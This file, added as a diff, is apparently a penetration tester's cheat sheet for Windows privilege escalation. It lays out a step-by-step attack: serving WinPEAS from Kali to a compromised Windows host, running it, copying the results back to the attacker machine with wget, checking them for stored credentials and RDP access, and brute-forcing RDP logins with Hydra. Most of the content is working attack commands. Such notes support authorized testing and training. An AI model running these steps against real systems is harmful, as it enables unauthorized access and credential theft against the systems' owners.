@@ -1,0 +1,54 @@
+#########################################
+# WinPEAS – Privilege Escalation Scan   #
+#########################################
+
+-----------------------------------------
+1. Transfer WinPEAS to the compromised Windows
+-----------------------------------------
+# On Kali (host WinPEAS for download)
+python3 -m http.server 8089
+
+# On Windows (browser)
+http://<KALI_IP>:8089
+# Download WinPEASx64.exe to the target machine
+
+-----------------------------------------
+2. Run WinPEAS and save output to a file
+-----------------------------------------
+.\winPEASx64.exe > output.txt
+# Saves all WinPEAS findings to output.txt for analysis
+
+-----------------------------------------
+3. Transfer output.txt from Windows to Kali for investigation
+-----------------------------------------
+# On Windows (host output file)
+python3 -m http.server 8090
+
+# On Kali (download with wget)
+wget http://<WIN_IP>:8090/output.txt -O output.txt
+# Now WinPEAS results are available on Kali for analysis
+
+-----------------------------------------
+4. Analyze WinPEAS findings
+-----------------------------------------
+# Manually review 'output.txt' for:
+# • Stored credentials
+# • RDP enabled or not
+# • Local users with login rights
+# • Password policy
+# • Service misconfigurations
+# • Installed software version leaks
+
+-----------------------------------------
+5. Bruteforce RDP Users Discovered from WinPEAS
+-----------------------------------------
+# Hydra brute force attack against RDP:
+hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>
+# -L = file containing usernames identified from WinPEAS
+# -P = password list or mutated passwords
+
+# If using single user and password list:
+hydra -l <USERNAME> -P passwords.txt rdp://<TARGET_IP>
+
+# If using both username list + password list:
+hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>
